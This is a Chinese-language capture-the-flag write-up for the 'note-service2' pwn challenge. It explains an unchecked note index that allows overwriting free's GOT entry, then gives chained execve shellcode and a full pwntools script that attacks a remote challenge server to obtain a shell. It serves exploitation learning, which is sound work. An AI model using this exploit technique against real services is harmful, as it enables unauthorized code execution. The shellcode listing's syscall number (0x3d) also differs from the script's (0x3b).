# note-service2

题目来源：https://adworld.xctf.org.cn/task/

这道题是可以说第一道正式做的有关堆部分的题目，漏洞的原因是为受限制的数组下标，这样保证可以访问到任意内存的空间，先看一下安全防护：

```
Arch:     amd64-64-little                                               
RELRO:    Partial RELRO                                                     
Stack:    Canary found                                                      
NX:       NX disabled                                                       
PIE:      PIE enabled                                                       
RWX:      Has RWX segments
```

栈中有 canary 并且存在 PIE，说明这道题很难构造栈溢出的漏洞，而 NX 防护没有开启，意味着堆栈段的代码是可以执行的，这也有可能意味着需要我们自行在堆栈中堆叠代码片段。下面看一下代码，本题的代码有点零碎，而且不从 main 函数入手：

```c
void sub_E30()
{
  __int64 savedregs; // [rsp+10h] [rbp+0h]

  while ( 1 )
  {
    sub_C56();
    printf("your choice>> ");
    sub_B91();
    switch ( (unsigned int)&savedregs )
    {
      case 1u:
        sub_CA5();
        break;
      case 2u:
        sub_DC1();
        break;
      case 3u:
        sub_DD4();
        break;
      case 4u:
        sub_DE7();
        break;
      case 5u:
        exit(0);
        return;
      default:
        puts("invalid choice");
        break;
    }
  }
}

int sub_CA5()
{
  int result; // eax
  int v1; // [rsp+8h] [rbp-8h]
  unsigned int v2; // [rsp+Ch] [rbp-4h]

  result = dword_20209C;
  if ( dword_20209C >= 0 )
  {
    result = dword_20209C;
    if ( dword_20209C <= 11 )
    {
      printf("index:");
      v1 = sub_B91();
      printf("size:");
      result = sub_B91();
      v2 = result;
      if ( result >= 0 && result <= 8 )
      {
        qword_2020A0[v1] = malloc(result);
        if ( !qword_2020A0[v1] )
        {
          puts("malloc error");
          exit(0);
        }
        printf("content:");
        sub_B69((__int64)qword_2020A0[v1], v2);
        result = dword_20209C++ + 1;
      }
    }
  }
  return result;
}

void sub_DE7()
{
  int v0; // ST0C_4

  printf("index:");
  v0 = sub_B91();
  free(qword_2020A0[v0]);
}
```

这是这道题最核心的一些代码，题目的意思是实现了一个可以添加笔记的一个程序，选项 1 调用 sub_CA5 历程能够在堆中开辟空间添加笔记，而 sub_DE7 则是删除笔记释放空间。虽然这道题 sub_DE7 例程中也存在问题，但是这道题的主要漏洞不在于此，着重分析一下 sub_CA5 例程。

添加笔记的逻辑中，用户一共能够添加最多 11 个笔记，而程序中定义了全局变量 qword_2020A0 是一个字符串数组，每一项记录了笔记的内容，而这个数组的每一项在堆上开辟。笔记的长度最大为 7 个字节，这是由 sub_B69 例程决定的。

这道题的主要漏洞在于添加笔记选择序号 index 的时候没有考虑边界，这样产生了堆上的任意地址写。因为确定写入位置完全靠 qword_2020A0 和偏移量，然后再仔细观察 IDA 中全局变量区和 got 表的关系，qword_2020A0 的地址在 0x002020A0，而 got 表位置则就在 bss 数据上方，所以很好通过偏移找到。

这道题的思路在于，获得 got 表的偏移，然后将指令写入 free 函数的 got 表项，这样触发 free 函数也就触发了编写的 shellcode。不过我们也能发现实际上一次性只能向堆中写入 7 个字节，所以真正的操作，需要由申请的多个片段连接起来，形成一个调用链，使用 jmp 指令可以完成这一步。我们需要插入的 shellcode 如下，使用 execve 调用来获取 shell：

```
mov rdi, $"\bin\sh"
xor rsi, rsi
xor rdx, rdx
push 0x3d
pop rax
syscall
```

这里有几点首先 mov rdi 的那一步可以引起，因为假设存储字符串操作完成后 rdi 就是字符串的地址了，而为什么这里不选择使用 mov rax, 0x3d，这和每条指令的长度有关，可以参考一下：https://www.cnblogs.com/huangshengpeng/p/13488760.html，那么关于堆的分配由于在 linux 中实现的堆必然包括如下部分：

* 上一块的大小或者最后 8 个字节
* 本快大小 8 字节
* 前向指针 8 字节
* 后向指针 8 字节

在该块被分配后前向指针和后向指针被用来作为堆中数据，所以一个块至少要有 32 字节，我们除了在堆中写上述的指令之外，还需要在每一条指令后面添加跳转语句，这样就可以使代码片段连接起来。由于每个块只有 32 个字节，所以使用 jmp short 指令进行跳转，而偏移是 0x1(\x00) + 0x08 + 0x08 + 0x08 = 0x19。执行脚本代码如下：

```python
from pwn import *                                                                    
from LibcSearcher import *                                                         
import time                                                                                                                                                                
filepath = "../../mnt/c/Users/lenovo/Desktop/1f10c9df3d784b5ba04b205c1610a11e"                                                          
def addnote(conn, index, size, content):                       
	conn.sendline("1")                           
	conn.recvuntil("index:")                        
	conn.sendline(str(index))                                   
	print conn.recvuntil("size:")              
	conn.sendline(str(size))             
	print conn.recvuntil("content:")                
	conn.send(content)                                                                                                                        
context(arch="amd64", os ="linux")                  
elf = ELF(filepath)                                                    
conn = remote("220.249.52.133", 50531)                              
print conn.recv()                                               
print conn.recv()                                                   
addnote(conn, 0, 8, "/bin/sh")                             
print conn.recvuntil("choice>> ")                          
addnote(conn, (elf.got["free"]-0x2020A0)/8, 8, asm("xor rsi,rsi") + "\x90\x90\xeb\x19")
print conn.recvuntil("choice>> ")                                
addnote(conn, 1, 8, asm("xor rdx, rdx") + "\x90\x90\xeb\x19")         
print conn.recvuntil("choice>> ")                        
addnote(conn, 2, 8, asm("push 0x3b\n pop rax") + "\x90\x90\xeb\x19")      
print conn.recvuntil("choice>> ")                                   
addnote(conn, 3, 8, asm("syscall") + "\x90"*0x5)                 
print conn.recvuntil("choice>> ")                                
conn.sendline("4")                                                      
print conn.recvuntil("index:")                               
conn.sendline("0")                                          
conn.interactive() 
```

